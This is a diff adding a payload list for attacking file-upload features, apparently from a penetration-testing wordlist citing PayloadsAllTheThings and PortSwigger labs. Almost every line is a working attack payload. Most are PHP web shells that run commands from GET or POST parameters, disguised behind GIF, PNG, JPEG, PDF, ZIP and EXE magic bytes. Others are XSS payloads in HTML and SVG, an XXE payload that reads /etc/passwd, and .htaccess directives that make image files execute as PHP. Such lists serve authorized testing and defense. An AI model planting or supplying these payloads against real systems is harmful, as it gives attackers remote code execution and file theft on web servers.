@@ -1,0 +1,48 @@
+# File upload — polyglot / magic-byte shells (PAT + PortSwigger polyglot lab)
+# File body prefixes — prepend to PHP/ASP shell content. Authorized testing only.
+
+GIF89a<?php system($_GET['c']); ?>
+GIF87a<?php system($_GET['c']); ?>
+\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>
+\xff\xd8\xff<?php system($_GET['c']); ?>
+<?php system($_GET['c']); __halt_compiler(); ?>
+<script language="php">system($_GET['c']);</script>
+<?=`$_GET[c]`?>
+<?=`id`?>
+<?=`system($_GET[c])`?>
+<?php eval($_POST['c']); __halt_compiler(); ?>
+<?php @eval($_POST['x']); __halt_compiler(); ?>
+<?php passthru($_GET['c']); __halt_compiler(); ?>
+<?php echo 'GIF89a'; system($_GET['c']); __halt_compiler(); ?>
+GIF89a
+<?php system($_GET['c']); ?>
+PNG
+<?php system($_GET['c']); ?>
+JFIF
+<?php system($_GET['c']); ?>
+BM
+<?php system($_GET['c']); ?>
+ID3
+<?php system($_GET['c']); ?>
+RIFF
+<?php system($_GET['c']); ?>
+PK
+<?php system($_GET['c']); ?>
+MZ
+<?php system($_GET['c']); ?>
+%PDF-
+<?php system($_GET['c']); ?>
+<!DOCTYPE html><html><body><?php system($_GET['c']); ?></body></html>
+<html><body><script>alert(1)</script></body></html>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>
+<svg/onload=alert(1)>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
+AddType application/x-httpd-php .jpg
+AddType application/x-httpd-php .gif
+AddType application/x-httpd-php .png
+AddHandler application/x-httpd-php .jpg
+SetHandler application/x-httpd-php
+php_flag engine on
+<FilesMatch ".">
+SetHandler application/x-httpd-php
+</FilesMatch>
